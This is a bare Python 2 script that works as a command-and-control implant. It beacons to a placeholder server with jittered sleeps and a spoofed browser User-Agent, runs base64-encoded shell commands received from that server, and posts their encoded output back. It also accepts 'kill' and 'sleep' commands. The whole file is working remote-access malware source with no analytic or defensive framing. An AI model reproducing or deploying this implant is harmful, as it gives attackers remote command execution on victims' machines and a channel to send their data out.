#!/usr/bin/python

import urllib2
import time
import commands
import base64
import sys
from random import randint
p = urllib2.ProxyHandler({'https': ''}) # Add proxy if needed
opr = urllib2.build_opener(p)
urllib2.install_opener(opr)
td = 0
id = str(randint(0, 100000))
jit = 5
delay = 5
hds = {'Accept': 'text/html', 'User-Agent': 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)'}
h = 'http://host:port'
k = False

def wait():
    td = delay + randint(0, jit)
    print 'Sleeping for ' + str(td) + ' seconds.'
    time.sleep(int(td))
    return

def check():
    try:
        session = urllib2.Request(h + '/en?s=' + id)
        response = urllib2.urlopen(session)
        response = response.read().strip()
    except:
      pass
    if response == 'Resource Not Found':
        pass
    else:
        try:
            payl = response.split('|')[0].strip()
            recid = int(response.split('|')[1])
            if recid == int(id):
                pay = base64.b64decode(payl)
                if pay == 'kill':
                    k = True
                    raise
                elif 'sleep' in pay:
                    t = pay.split(' ')[1]
                    global delay
                    delay = int(t)
                else:
                    f = \
                        commands.getstatusoutput(base64.b64decode(payl))[1]
                    pms = 'track=' + base64.b64encode(f) + '|' \
                        + id
                    req = urllib2.Request(h + '/en', pms, hds)
                    req1 = urllib2.urlopen(req)
            else:
                pass
        except:
            if k:
                sys.exit()
            else:
                pass
    wait()

while True:
    check()
